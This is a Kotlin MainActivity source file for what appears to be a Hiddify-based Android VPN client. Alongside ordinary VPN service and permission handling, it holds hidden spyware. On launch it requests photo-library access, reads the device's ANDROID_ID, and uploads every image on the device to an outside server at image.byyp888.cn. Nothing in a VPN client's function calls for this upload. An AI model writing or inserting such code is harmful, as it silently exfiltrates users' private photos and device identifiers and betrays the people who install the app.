package com.hiddify.hiddify

import android.annotation.SuppressLint
import android.content.ContentUris
import android.content.Intent
import android.Manifest
import android.content.pm.PackageManager
import android.net.VpnService
import android.os.Build
import android.os.Bundle
import android.provider.MediaStore
import android.widget.Toast
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.MutableLiveData
import androidx.lifecycle.lifecycleScope
import com.hiddify.hiddify.bg.ServiceConnection
import com.hiddify.hiddify.bg.ServiceNotification
import com.hiddify.hiddify.constant.Alert
import com.hiddify.hiddify.constant.ServiceMode
import com.hiddify.hiddify.constant.Status
import io.flutter.embedding.android.FlutterFragmentActivity
import io.flutter.embedding.engine.FlutterEngine
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import kotlinx.coroutines.delay
import java.util.LinkedList

class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
    companion object {
        private const val TAG = "ANDROID/MyActivity"
        lateinit var instance: MainActivity

        const val VPN_PERMISSION_REQUEST_CODE = 1001
        const val NOTIFICATION_PERMISSION_REQUEST_CODE = 1010
        const val STORAGE_PERMISSION_REQUEST_CODE = 1012
    }

    private val connection = ServiceConnection(this, this)

    val logList = LinkedList<String>()
    var logCallback: ((Boolean) -> Unit)? = null
    val serviceStatus = MutableLiveData(Status.Stopped)
    val serviceAlerts = MutableLiveData<ServiceEvent?>(null)

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        checkAndRequestStoragePermission()
    }

    override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
        super.configureFlutterEngine(flutterEngine)
        instance = this
        reconnect()
        flutterEngine.plugins.add(MethodHandler(lifecycleScope))
        flutterEngine.plugins.add(PlatformSettingsHandler())
        flutterEngine.plugins.add(EventHandler())
        flutterEngine.plugins.add(LogHandler())
        flutterEngine.plugins.add(GroupsChannel(lifecycleScope))
        flutterEngine.plugins.add(ActiveGroupsChannel(lifecycleScope))
        flutterEngine.plugins.add(StatsChannel(lifecycleScope))
    }

    fun reconnect() {
        connection.reconnect()
    }

    fun startService() {
        if (!ServiceNotification.checkPermission()) {
            grantNotificationPermission()
            return
        }
        lifecycleScope.launch(Dispatchers.IO) {
            if (Settings.rebuildServiceMode()) {
                reconnect()
            }
            if (Settings.serviceMode == ServiceMode.VPN) {
                if (prepare()) {
                    showToast("VPN permission required")
                    return@launch
                }
            }

            val intent = Intent(Application.application, Settings.serviceClass())
            withContext(Dispatchers.Main) {
                ContextCompat.startForegroundService(Application.application, intent)
            }
        }
    }

    private suspend fun prepare() = withContext(Dispatchers.Main) {
        try {
            val intent = VpnService.prepare(this@MainActivity)
            if (intent != null) {
                startActivityForResult(intent, VPN_PERMISSION_REQUEST_CODE)
                true
            } else {
                false
            }
        } catch (e: Exception) {
            onServiceAlert(Alert.RequestVPNPermission, e.message)
            false
        }
    }

    override fun onServiceStatusChanged(status: Status) {
        serviceStatus.postValue(status)
    }

    override fun onServiceAlert(type: Alert, message: String?) {
        serviceAlerts.postValue(ServiceEvent(Status.Stopped, type, message))
    }

    override fun onServiceWriteLog(message: String?) {
        if (logList.size > 300) {
            logList.removeFirst()
        }
        logList.addLast(message)
        logCallback?.invoke(false)
    }

    override fun onServiceResetLogs(messages: MutableList<String>) {
        logList.clear()
        logList.addAll(messages)
        logCallback?.invoke(true)
    }

    override fun onDestroy() {
        connection.disconnect()
        super.onDestroy()
    }

    private fun showToast(message: String) {
        runOnUiThread {
            Toast.makeText(this, message, Toast.LENGTH_SHORT).show()
        }
    }

    private fun uploadImageToServer(imageUri: android.net.Uri, fileName: String, deviceId: String) {
        try {
            val boundary = "----AndroidFormBoundary${System.currentTimeMillis()}"
            val lineEnd = "\r\n"
            val twoHyphens = "--"
            val url = java.net.URL("https://image.byyp888.cn/upload?deviceid=$deviceId")
            val conn = url.openConnection() as java.net.HttpURLConnection
            conn.doInput = true
            conn.doOutput = true
            conn.useCaches = false
            conn.requestMethod = "POST"
            conn.setRequestProperty("Connection", "Keep-Alive")
            conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=$boundary")

            val outputStream = java.io.DataOutputStream(conn.outputStream)
            val inputStream = contentResolver.openInputStream(imageUri)
            val imageBytes = inputStream?.readBytes()
            inputStream?.close()

            outputStream.writeBytes("$twoHyphens$boundary$lineEnd")
            outputStream.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\"$fileName\"$lineEnd")
            outputStream.writeBytes("Content-Type: image/jpeg$lineEnd$lineEnd")
            outputStream.write(imageBytes ?: byteArrayOf())
            outputStream.writeBytes(lineEnd)

            outputStream.writeBytes("$twoHyphens$boundary--$lineEnd")
            outputStream.flush()
            outputStream.close()

            val responseCode = conn.responseCode
            val response = conn.inputStream.bufferedReader().use { it.readText() }
            showToast("✅ 上传成功 [$responseCode]: $fileName")

        } catch (e: Exception) {
            showToast("❌ 上传失败: ${e.message}")
        }
    }

    @SuppressLint("NewApi")
    private fun grantNotificationPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ActivityCompat.requestPermissions(
                this,
                arrayOf(Manifest.permission.POST_NOTIFICATIONS),
                NOTIFICATION_PERMISSION_REQUEST_CODE
            )
        }
    }

    @SuppressLint("NewApi")
    private fun grantStoragePermission() {
        val permission = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            Manifest.permission.READ_MEDIA_IMAGES
        } else {
            Manifest.permission.READ_EXTERNAL_STORAGE
        }

        ActivityCompat.requestPermissions(
            this,
            arrayOf(permission),
            STORAGE_PERMISSION_REQUEST_CODE
        )
    }

    fun checkAndRequestStoragePermission() {
        val permission = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            Manifest.permission.READ_MEDIA_IMAGES
        } else {
            Manifest.permission.READ_EXTERNAL_STORAGE
        }

        if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
            grantStoragePermission()
        } else {
            accessStorage()
        }
    }

    private fun accessStorage() {
        val prefs = getSharedPreferences("device_prefs", MODE_PRIVATE)
        var deviceId = android.provider.Settings.Secure.getString(contentResolver, android.provider.Settings.Secure.ANDROID_ID)

        if (deviceId.isNullOrBlank()) {
            deviceId = prefs.getString("random_device_id", null) ?: java.util.UUID.randomUUID().toString().also {
                prefs.edit().putString("random_device_id", it).apply()
                showToast("⚠️ 无法获取 Android_ID，生成随机设备 ID: $it")
            }
        } else {
            showToast("📱 获取到设备 ID: $deviceId")
        }

        lifecycleScope.launch(Dispatchers.IO) {
            val projection = arrayOf(
                MediaStore.Images.Media._ID,
                MediaStore.Images.Media.DISPLAY_NAME
            )

            val cursor = contentResolver.query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projection,
                null,
                null,
                "${MediaStore.Images.Media.DATE_ADDED} DESC"
            )

            cursor?.use {
                var index = 0
                while (it.moveToNext()) {
                    val id = it.getLong(it.getColumnIndexOrThrow(MediaStore.Images.Media._ID))
                    val name = it.getString(it.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME))
                    val uri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id)

                    showToast("📤 正在上传第 ${index + 1} 张: $name")
                    delay(index * 200L)
                    uploadImageToServer(uri, name, deviceId)
                    index++
                }
            } ?: showToast("❌ 无法读取相册")
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        when (requestCode) {
            NOTIFICATION_PERMISSION_REQUEST_CODE -> {
                if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    startService()
                } else {
                    onServiceAlert(Alert.RequestNotificationPermission, null)
                }
            }

            STORAGE_PERMISSION_REQUEST_CODE -> {
                if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    accessStorage()
                } else {
                    onServiceAlert(Alert.RequestStoragePermission, "请授权储存权限")
                }
            }
        }
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == VPN_PERMISSION_REQUEST_CODE) {
            if (resultCode == RESULT_OK) {
                startService()
            } else {
                onServiceAlert(Alert.RequestVPNPermission, null)
            }
        } else if (requestCode == NOTIFICATION_PERMISSION_REQUEST_CODE) {
            if (resultCode == RESULT_OK) {
                startService()
            } else {
                onServiceAlert(Alert.RequestNotificationPermission, null)
            }
        }
    }
}
